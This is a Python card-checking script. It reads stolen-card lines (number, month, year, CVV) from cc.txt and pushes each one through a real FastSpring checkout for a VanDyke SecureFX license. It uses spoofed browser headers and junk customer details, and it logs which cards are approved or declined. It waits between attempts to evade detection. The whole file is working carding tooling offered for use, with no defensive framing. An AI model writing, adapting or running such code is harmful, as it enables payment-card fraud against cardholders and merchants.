import re
import os
import sys
import time
import subprocess
import importlib

for mod in ["requests"]:
    try:
        importlib.import_module(mod)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", mod, "-q"])

import requests

VK = "https://www.vandyke.com/cgi-bin"
FS = "https://sites.fastspring.com/vandyke"
PROD = "securefx1yearlicense"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "tr-TR,tr;q=0.5",
    "Sec-GPC": "1",
    "Upgrade-Insecure-Requests": "1",
}


def extract_vs(html):
    m = re.search(r'<input[^>]*name="javax\.faces\.ViewState"[^>]*value="([^"]+)"', html)
    return m.group(1) if m else None


def extract_msg(html):
    clean = re.sub(r"<(script|style)[^>]*>.*?</\1>", "", html, flags=re.DOTALL)
    clean = re.sub(r"<[^>]+>", "\n", clean)
    clean = re.sub(r"[\xa0]", " ", clean)
    lines = [l.strip() for l in clean.split("\n") if l.strip() and len(l.strip()) > 10]
    best = ""
    for l in lines:
        low = l.lower()
        score = sum(w in low for w in ["order", "cancel", "fail", "declin", "error", "thank", "confirm", "accept", "regret", "payment"])
        if score >= 2 and len(l) > len(best):
            best = l.strip()
    return best[:400]


class FastSpringCheck:
    def __init__(self, card):
        self.card = card
        self.s = requests.Session()
        self.s.headers.update(HEADERS)
        self.vs = None
        self.jsid = ""
        self.msg = ""

    def g(self, url, **kw):
        return self.s.get(url, timeout=30, **kw)

    def p(self, url, data, **kw):
        if self.vs:
            data["javax.faces.ViewState"] = self.vs
        return self.s.post(url, data=data, timeout=30, **kw)

    def run(self):
        try:
            self.p(f"{VK}/purchase_select_country.php", {
                "PID": "40", "UP": "1", "COUNTRY": "us", "STATE": "KY",
                "privacy_stmt": "I agree", "PAYMENT_METHOD": "cc",
            })

            self.g(f"{FS}/product/{PROD}?action=adds&language=en&country=US")

            r = self.p(f"{FS}/product/{PROD}", {
                "ProductFormNPM:select_for_1Dz0Bux3R4m8nXvn_XSbJw": "ProductFormNPM:select_a17bbfe8-535b-4a57-b378-d81b77982245",
                "ProductFormNPM:select_a17bbfe8-535b-4a57-b378-d81b77982245": "1Dz0Bux3R4m8nXvn_XSbJw",
                "ProductFormNPM:select_for_euOwioaEQz2HIWTmH2n7vA": "ProductFormNPM:select_a17bbfe8-535b-4a57-b378-d81b77982245",
                "ProductFormNPM:main_product": ["1Dz0Bux3R4m8nXvn_XSbJw", "euOwioaEQz2HIWTmH2n7vA"],
                "frame_ancestor_url": "",
                "action": "ProductFormNPM:product_action_order",
            })
            if r.status_code not in (200, 302):
                return "declined"

            r = self.g(f"{FS}/order/customer")
            self.vs = extract_vs(r.text)
            self.jsid = self.s.cookies.get("JSESSIONID", "")
            j = f";jsessionid={self.jsid}" if self.jsid else ""

            cust_data = {
                "user": "user", "user:j_idt1768:0:j_idt1883": "1",
                "user:fname": "asdas", "user:lname": "dasasdas",
                "user:company": "asdas", "user:phone_number": "+1 520 556 4982",
                "user:email": "asdasdasdas@gmail.com",
                "user:emailConfirmation": "asdasdasdas@gmail.com",
                "user:country": "US", "user:address_1": "asdas",
                "user:address_2": "dasasdas", "user:city": "asdasdas",
                "user:region": "US-AL", "user:region_custom": "",
                "user:region_interp": "", "user:postal_code": "35758",
                "user:paymentMethodSelection": "cc",
                "user:processCommand": "user:processCommand",
            }
            r = self.p(f"{FS}/order/view{j}", cust_data)

            if "resubmit" in r.text.lower():
                self.vs = extract_vs(r.text)
                r = self.p(f"{FS}/order/view{j}", cust_data)

            r = self.g(f"{FS}/order/confirm")
            self.vs = extract_vs(r.text)

            pay_data = {
                "confirm": "confirm",
                "confirm:card_number": self.card["number"],
                "confirm:card_exp_month": self.card["month"],
                "confirm:card_exp_year": self.card["year"],
                "confirm:card_security_code": self.card["cvv"],
                "confirm:billingSetting": "true", "confirm:country": "US",
                "confirm:address_1": "asdas", "confirm:address_2": "dasasdas",
                "confirm:city": "asdasdas", "confirm:region": "US-AL",
                "confirm:region_custom": "", "confirm:region_interp": "",
                "confirm:postal_code": "35758",
                "confirm:j_idt2010": "not_sanctioned",
                "confirm:processCommand": "confirm:processCommand",
            }
            r = self.p(f"{FS}/order/view{j}", pay_data)

            new_vs = extract_vs(r.text)
            if new_vs and "resubmit" in r.text.lower():
                self.vs = new_vs
                r = self.p(f"{FS}/order/view{j}", pay_data)

            body = r.text
            self.msg = extract_msg(body)

            if "Order Failed" in body or "could not be accepted" in body or "Order Canceled" in body:
                return "declined"
            if "Order Confirmed" in body or "Thank you" in body:
                return "approved"
            return "declined"

        except Exception as e:
            self.msg = str(e)
            return "error"


def main():
    if not os.path.exists("cc.txt"):
        print("[!] cc.txt not found"); sys.exit(1)

    with open("cc.txt") as f:
        cards = [l.strip() for l in f if l.strip()]

    print(f"[*] Loaded {len(cards)} cards\n")

    app = []
    dec = []

    for i, line in enumerate(cards, 1):
        parts = [x.strip() for x in line.split("|")]
        if len(parts) < 4:
            print(f"[!] Invalid format line {i}: {line}"); dec.append(line); continue

        card = {"number": parts[0], "month": parts[1], "year": parts[2], "cvv": parts[3]}

        ch = FastSpringCheck(card)
        r = ch.run()

        if r == "approved":
            print(f"#Approved  {line}")
            app.append(line)
        elif r == "declined":
            print(f"#Declined  {line}")
            if ch.msg:
                print(f" {ch.msg}")
            dec.append(line)
        else:
            print(f"#Error  {line}")
            if ch.msg:
                print(f" {ch.msg}")
            dec.append(line)

        with open("approved.txt", "w") as f:
            f.write("\n".join(app) + ("\n" if app else ""))
        with open("declined.txt", "w") as f:
            f.write("\n".join(dec) + ("\n" if dec else ""))

        if i < len(cards):
            time.sleep(3)

    print(f"\n[Done] Approved: {len(app)}, Declined: {len(dec)}")


if __name__ == "__main__":
    main()
